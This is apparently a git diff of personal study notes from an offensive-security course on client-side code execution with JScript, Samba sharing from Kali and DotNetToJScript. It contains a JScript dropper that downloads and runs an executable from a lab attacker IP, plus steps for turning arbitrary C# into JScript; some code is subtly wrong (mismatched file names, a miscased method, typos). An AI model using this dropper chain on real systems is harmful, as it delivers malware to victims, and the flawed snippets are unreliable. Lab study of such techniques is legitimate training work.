@@ -52,13 +52,117 @@ creating a dropper to inject the payload into.
 
 dropper.jse works but is detected as malicious.
 
-### starting samba in kali
+```js
+var url = "http://10.10.6.12/shell.exe"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+Object.Open('GET', url, false);
+Object.Send();
+if (Object.Status == 200)
+{
+ var Stream = WScript.CreateObject('ADODB.Stream');
+ Stream.Open();
+ Stream.Type = 1;
+ Stream.Write(Object.ResponseBody);
+ Stream.Position = 0;
+ Stream.SaveToFile("met.exe", 2);
+ Stream.Close();
+}
+var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
+```
+
+### 4.1.2.1 Exercises
+1. Replicate the Jscript file from this section.
+
+done 
+2. Modify the Jscript code to make it proxy-aware with the setProxy method. You can use the 
+Squid proxy server installed on the Windows 10 development machine.
+
+# Jscript and C#
+
+Since there’s no known way to invoke the Win32 APIs directly from Jscript, we’ll instead embed a 
+compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as 
+PowerShell since we will have comparable access to the .NET framework. 
+
+# introduction to visual studio
+
+we need to connect our kali instance with window
+
+install on kali
+
+```
+sudo apt install samba
+sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
+sudo nano /etc/samba/smb.conf
+```
+add this in the conf file
+
+```
+[visualstudio]
+path = /home/kali/data
+browseable = yes
+read only = no
+```
+
+we need to create a samba user that can access the share and then start when required.
+
+```
+sudo smbpasswd -a kali
+```
+
+starting the samba server
+
+```
+sudo systemctl start smbd
+sudo systemctl start nmbd
+```
+make a shared folder and open up the permissions for visual studio
+
+```
+mkdir /home/kali/data
+chmod -R 777 /home/kali/data
+```
+
+With everything set up, we’ll turn to our Windows 10 development machine. First, we’ll open the 
+new share in File Explorer (\\192.168.119.120 in our case). When prompted, we’ll enter the 
+username and password of the newly created SMB user and select the option to store the 
+credentials.
+
+Staring a simple helloworld application
+
+select visual studio
+create new project
+language select C#
+use console app(.Net framework)
+
+opening the app we see
+
+```C#
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+namespace ConsoleApp1
+{
+ class Program
+ {
+ static void Main(string[] args)
+ {  
+    console.WriteLine("Hello world");
+ }
+ }
+}
+```
+
+### 4.2.1.1 Exercises
+1. Set up the Samba share on your Kali system as shown in this section.
 
 ![](samba.png)
 
-### using C#
+   
+2. Create a Visual Studio project and follow the steps to compile and execute the “Hello World” 
+application.
 
-hellow eworld works
 
 ```
 Hello World!
@@ -69,10 +173,41 @@ Press any key to close this window . . .
 
 ```
 
-## Using DotNetToJsScript
+# Using DotNetToJsScript
+
+downloading DotNetTojscript
 using https://github.com/tyranid/DotNetToJScript
 
+
+looking into the project using vs studio, we see that 
+Jscript will eventually execute the content of the TestClass method, which is inside the TestClass
+class. In this case, we are simply executing the MessageBox.Show220 method.
+
+Notice that the Solution Explorer lists a second project (DotNetToJscript) that converts the 
+assembly into a format that Jscript can execute.
+
+after using relaese/build we find that we need DotNetToJscript.exe , NDesk.Options.dll and Exampleassembly.dll in order to rn the DotnetToJscript program.
+
+we can use the script as -
+
+DotNettoJScript.exe ExampleAssembly.dll --lanf=Jscript --ver=v4 -o demo.js.
+
 ![](./DotnetTojs.png)
+
+
+using dotnettojs script we an execute any arbritary C# script as JSScript
+
+### 4.2.2.1 Exercises
+1. Set up the DotNetToJscript project, share it on the Samba share, and open it in Visual Studio.
+2. Compile the default ExampleAssembly project and convert it into a Jscript file with 
+DotNetToJscript.
+3. Modify the TestClass.cs file to make it launch a command prompt instead of opening a 
+MessageBox
+
+```
+ string command = "notepad.exe";
+ Process.Start("cmd.exe", "/C" + command);
+```
 
 ## using win32 api on C#
 
